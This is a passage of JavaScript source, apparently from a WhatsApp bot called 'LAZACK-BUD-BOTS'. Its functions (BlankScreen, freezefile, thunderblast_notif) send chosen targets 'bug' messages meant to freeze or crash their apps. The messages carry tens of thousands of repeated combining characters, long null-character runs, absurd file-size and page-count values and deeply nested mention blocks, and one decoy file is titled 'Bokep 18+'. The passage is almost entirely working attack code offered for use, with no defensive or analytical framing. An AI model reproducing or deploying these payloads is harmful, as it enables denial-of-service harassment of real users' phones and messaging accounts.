̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            groupMentions: [
                                {
                                    groupJid: "1@newsletter", 
                                    groupSubject: "UNDEFINED",  
                                    groupMetadata: {
                                        creationTimestamp: 1715880173,  
                                        ownerJid: "owner@newsletter",  
                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
                                    }
                                }
                            ],
                            externalContextInfo: {
                                customTag: "SECURE_PAYBUG_MESSAGE",  
                                securityLevel: "HIGH",  
                                referenceCode: "PAYBUG10291",  
                                timestamp: new Date().toISOString(),  
                                messageId: "MSG00123456789",  
                                userId: "UNDEFINED"  
                            },
                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    Lazack28.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
let virtex = "🔐 LAZACK-BUD-BOTS" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
			await Lazack28.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://img86.pixhost.to/images/487/563032543_skyzopedia.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://img86.pixhost.to/images/487/563032543_skyzopedia.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('🔐 LAZACK-BUD-BOTS'))
   	};
async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "🔐 LAZACK-BUD-BOTS" + "ြ".repeat(25000);
    await Lazack28.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function thunderblast_notif(target) {
			await Lazack28.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://img86.pixhost.to/images/487/563032543_skyzopedia.jpg',
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸